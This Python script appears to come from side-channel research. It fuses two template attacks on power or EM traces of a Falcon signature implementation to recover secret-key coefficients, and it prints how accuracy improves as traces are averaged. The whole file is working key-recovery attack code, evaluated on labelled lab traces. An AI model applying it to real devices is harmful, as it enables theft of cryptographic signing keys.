"""Step 4b - Combined two-leak attack: fuse leak1 (decode) and leak2 (mod-q).

Each leak gives a per-class score (Mahalanobis distance to the class template
under its pooled covariance == a Gaussian log-likelihood). Two INDEPENDENT
measurements of the same secret combine by ADDING their log-likelihoods:

    score_combined(class) = score_leak1(class) + score_leak2(class)

This resolves the Hamming-weight collisions that cap either leak on its own
(e.g. values that collide at the decode POI separate at the mod-q POI), so the
combined accuracy beats both single leaks. Prints leak1 / leak2 / combined
side by side so the gain is visible.

Run:  python falcon_attack_combined.py  LEAK1_TEST_glob  LEAK2_TEST_glob
      (templates_leak1.npz and templates_leak2.npz must exist - make them with
       falcon_train_template.py LEARN.trs templates_leakN.npz)
"""
import glob
import sys

import numpy as np
import trsfile

L1_NPZ = "templates_leak1.npz"
L2_NPZ = "templates_leak2.npz"
TEST1 = sys.argv[1] if len(sys.argv) > 1 else "falcon_leak1_TEST_class*_keyed.trs"
TEST2 = sys.argv[2] if len(sys.argv) > 2 else "falcon_leak2_TEST_class*_keyed.trs"
N_AVG_SWEEP = [1, 5, 20, 50, 100]


def read_class(params):
    if "f0_class" in params:
        return int(params["f0_class"].value[0])
    if "f0" in params:
        b = bytes(params["f0"].value)[0]
        return (b - 256 if b >= 128 else b) + 10
    raise KeyError("trace has neither 'f0_class' nor 'f0'")


def load_test(glob_pat, pois):
    Xs, ys = [], []
    for path in sorted(glob.glob(glob_pat)):
        with trsfile.trs_open(path, "r") as ts:
            for i in range(len(ts)):
                Xs.append(np.asarray(ts[i].samples)[pois])
                ys.append(read_class(ts[i].parameters))
    return np.asarray(Xs, np.float32), np.asarray(ys, np.int64)


def scorer(npz):
    T = np.load(npz)
    return {"pois": T["pois"], "classes": T["classes"], "cmean": T["cmean"],
            "covinv": np.linalg.pinv(T["cov"]), "mu": T["mu"], "sd": T["sd"]}


def maha(feat, S):
    """Per-class Mahalanobis distance for one query vector (lower = better)."""
    fz = (feat - S["mu"]) / S["sd"]
    diff = S["cmean"] - fz
    return np.einsum("cj,jk,ck->c", diff, S["covinv"], diff)


def main():
    S1, S2 = scorer(L1_NPZ), scorer(L2_NPZ)
    classes = S1["classes"]
    X1, y1 = load_test(TEST1, S1["pois"])
    X2, y2 = load_test(TEST2, S2["pois"])
    print(f"leak1 test: {len(y1)} traces | leak2 test: {len(y2)} traces\n")

    rng = np.random.default_rng(0)
    print(f"{'N avg':>6} | {'leak1':>7} | {'leak2':>7} | {'combined':>9}")
    print("-" * 40)
    for navg in N_AVG_SWEEP:
        c1 = c2 = cc = tot = 0
        for c in classes:
            i1 = np.where(y1 == c)[0]; rng.shuffle(i1)
            i2 = np.where(y2 == c)[0]; rng.shuffle(i2)
            m = min(len(i1) // navg, len(i2) // navg)
            for k in range(m):
                q1 = X1[i1[k*navg:(k+1)*navg]].mean(0)
                q2 = X2[i2[k*navg:(k+1)*navg]].mean(0)
                s1, s2 = maha(q1, S1), maha(q2, S2)
                c1 += classes[s1.argmin()] == c
                c2 += classes[s2.argmin()] == c
                cc += classes[(s1 + s2).argmin()] == c
                tot += 1
        if tot:
            print(f"{navg:>6} | {100*c1/tot:6.2f}% | {100*c2/tot:6.2f}% | {100*cc/tot:8.2f}%   ({tot} queries)")


if __name__ == "__main__":
    main()
